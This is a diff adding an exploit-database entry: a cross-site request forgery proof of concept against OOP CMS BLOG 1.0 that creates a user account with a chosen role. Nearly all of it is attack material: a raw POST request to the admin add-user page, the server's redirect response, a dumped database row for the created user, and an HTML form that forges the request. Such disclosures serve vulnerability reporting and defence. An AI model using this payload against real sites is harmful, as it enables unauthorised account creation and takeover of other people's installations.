@@ -1,0 +1,116 @@
+# Exploit Title: OOP CMS BLOG 1.0 - Cross-Site Request Forgery (Add Admin)
+# Dork: N/A
+# Date: 2018-11-06
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://zsoft.com.bd/
+# Software Link: https://datapacket.dl.sourceforge.net/project/php-oop-cms-blog/blog_fo_rup.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/admin/addUser.php
+# 
+POST /[PATH]/admin/addUser.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=macg4h63q378u11758a1pslek7
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 85
+userName=efe&name=efe&password=efe&email=efe@omerefe.com&details=efe&role=1&submit=Create
+HTTP/1.1 302 Found
+Date: Tue, 06 Nov 2018 20:57:18 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Sat, 26 Jul 1997 05:00:00 GMT
+Cache-Control: max-age=2592000
+Pragma: no-cache
+Location: login.php
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+/* `exploitdb`.`tbl_user` */
+$tbl_user = array(
+  array('id' => '38','name' => 'efe','username' => 'efe','password' => '5ebf8364d17c8df7e4afd586c24f84a0','email' => 'efe@omerefe.com','details' => 'efe','role' => '1')
+);
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/admin/addUser.php
+# 
+<html>
+<body>
+<form action="http://192.168.1.36/ExploitDb/blog_fo_rup/admin/addUser.php" method="post" enctype="multipart/form-data">
+<table class="form">					
+<tbody><tr>
+<td>
+<label>User Name</label>
+</td>
+<td>
+<input name="userName" placeholder="Enter User Name..." type="text">
+</td>
+</tr>
+<tr>
+<td>
+<label>Full Name</label>
+</td>
+<td>
+<input name="name" placeholder="Enter User Full Name..." type="text">
+</td>
+</tr>
+<tr>
+<td>
+<label>User Password</label>
+</td>
+<td>
+<input name="password" placeholder="Enter User Password..." type="text">
+</td>
+</tr>
+<tr>
+<td>
+<label>Email</label>
+</td>
+<td>
+<input name="email" placeholder="Enter User Email..." type="text">
+</td>
+</tr>
+<tr>
+<td>
+<label>Details</label>
+</td>
+<td> 
+<textarea name="details"></textarea>
+</td>
+</tr>
+<tr>
+<td>
+<label>User Roll</label>
+</td>
+<td>
+<select id="select" name="role">
+<option>Select User Role</option>
+<option value="0">Admin</option>
+<option value="1">Author</option>
+<option value="2">Editor</option>
+</select>
+</td>
+</tr>
+<tr>
+<td></td> 
+<td>
+<input name="submit" value="Create" type="submit">
+</td>
+</tr>
+</tbody>
+</table>
+</form>
+</body>
+</html>
